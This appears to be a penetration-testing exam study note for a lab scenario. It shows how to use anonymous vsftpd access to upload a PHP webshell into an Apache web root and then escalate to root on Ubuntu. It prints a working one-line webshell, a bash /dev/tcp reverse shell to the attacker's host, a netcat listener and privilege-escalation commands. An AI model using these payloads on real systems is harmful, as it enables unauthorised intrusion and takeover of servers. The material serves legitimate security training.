# 📂 Scenario 03 — FTP + Apache Index (anon-upload → webshell)

> **Given (from nmap):** Ubuntu 22.04 standalone — `21 ftp vsftpd 3.0.5`, `22 ssh OpenSSH 8.9p1`, `80 http Apache 2.4.52` with **`http-title: Index of /`** (directory listing on). `20` and `53` closed. Goal: foothold → root + proof. Concrete route below; fill `<placeholders>` from your own output, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]]. Services: [[FTP]] · [[HTTP]] · [[SSH]]. Foothold: [[File Upload]] · [[RCE]] · [[Shells]]. Then: [[Linux Privilege Escalation]] · [[Credential Attacks]].

```bash
export IP=<TARGET_IP> ; mkdir -p nmap loot
```

---

## 🧠 READ THE SCAN (two facts decide this box)
1. **`Index of /` on port 80** = Apache is serving a **bare directory**, not an app. Whatever files are in that directory are browsable — and if something can *write* a file there, you get code execution.
2. **FTP (vsftpd 3.0.5) + a writable web root** is the classic pairing: **upload a PHP shell via FTP → trigger it over HTTP.**

> **Version discipline (important):** vsftpd **3.0.5 is current — it is NOT the backdoored 2.3.4.** There's no magic CVE here; the path is **anonymous/weak login + file write**, not an exploit. OpenSSH 8.9p1 is modern too (regreSSHion/CVE-2024-6387 technically touches this range but is wildly impractical on the exam — treat **SSH as cred-reuse only**, never the vector).

---

## 1️⃣ ENUMERATE BOTH SURFACES
```bash
sudo nmap -sC -sV -p21,22,80 $IP -oN nmap/services.txt
# FTP: try anonymous first
ftp $IP          # user: anonymous   pass: anonymous (or blank)
#   ls -la ; binary ; prompt off ; mget *     → pull everything, read it
# HTTP: just browse the index, then fuzz under it
curl -s http://$IP/ ; feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip
```
**The decisive test — is the FTP root the web root?**
```bash
# in FTP, upload a marker, then check if it appears over HTTP:
#   put test.txt
curl -s http://$IP/test.txt      # shows up?  → FTP writes land in the web root  → Route A
```

---

## 🅰️ ROUTE A — anon FTP write lands in the web root → webshell (primary)
If the marker appeared over HTTP, you have RCE:
```bash
# make a PHP shell
echo '<?php system($_GET["c"]); ?>' > cmd.php
# upload via FTP (binary mode), then execute over HTTP:
#   ftp> put cmd.php
curl "http://$IP/cmd.php?c=id"
# upgrade to a reverse shell:
curl "http://$IP/cmd.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("bash -c \"bash -i >& /dev/tcp/<KALI>/443 0>&1\""))')"
# (listener: nc -lvnp 443)   → www-data shell  ([[File Upload]] · [[Shells]] · [[RCE]])
```
If FTP uploads **don't** surface on HTTP, or writing is denied → Route B/C.

## 🅱️ ROUTE B — read-only loot (FTP contents + the directory index)
Browse everything the `Index of /` and FTP expose:
- backups (`.zip/.tar.gz/.bak`), source code, `config.php`, `.htpasswd`, notes, SSH keys, `.bash_history`.
- Any **credential or private key** → log in on **SSH (22)** → shell. Reuse every cred ([[Credential Attacks]]).

## 🅲 ROUTE C — deeper web enum
If the index is sparse, fuzz harder: bigger wordlists, extensions (`.php .txt .bak .old .zip`), `robots.txt`, and any app found under a subdir → match its input to a bug class ([[Web Enumeration]] → [[HTTP]]).

---

## 2️⃣ FOOTHOLD → PRIVESC (Ubuntu 22.04)
Stabilise, then run the standard checks:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # Ctrl+Z; stty raw -echo; fg; export TERM=xterm
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null ; getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.* ; ./linpeas.sh | tee loot/linpeas.txt
```
Priority order on a fresh Ubuntu: **`sudo -l` (GTFOBins)** → **SUID** → **cron/pspy** → **readable config/creds** (esp. anything the web app or FTP exposed) → capabilities → kernel last. → [[Linux Privilege Escalation]].

> **Loot reuse:** a cred found in an FTP file or web config is often the user's **SSH / sudo** password — always test it with `sudo -l` and `su`.

---

## 🗺️ DECISION FLOW
```
nmap: 21 ftp + 80 "Index of /" ──► anonymous FTP?
   │                                   │ yes
   │                                   ▼
   │                      put test.txt → visible at http://IP/ ?
   │                         │ yes                    │ no
   │                         ▼                         ▼
   │                  upload cmd.php → RCE (www-data)   read FTP + index loot
   │                         │                          │  (creds/keys)
   └── anon denied ──► weak-cred FTP / web enum ◄───────┘      ▼
                                   ▼                         SSH login
                            foothold ──► sudo -l / SUID / cron / creds ──► ROOT ✅
```

## 🚧 STUCK?
- Anon FTP works but write denied → look for **creds** in the readable files, reuse on FTP/SSH.
- Upload works but no RCE → is the file in a **web-served** path? try other upload dirs; confirm `.php` executes (not just downloads).
- Index looks empty → **fuzz with extensions**, check `robots.txt`, re-scan all TCP.
→ [[Standalone Boxes — Exam Solve Guide]] (Stuck section).

## 🧠 ONE-LINE LESSON
**`Index of /` + a writable FTP that maps to the web root = upload a PHP shell over FTP and run it over HTTP. vsftpd 3.0.5 has no backdoor, so the key is anonymous/weak login + the FTP-root-equals-web-root check — not a CVE.**
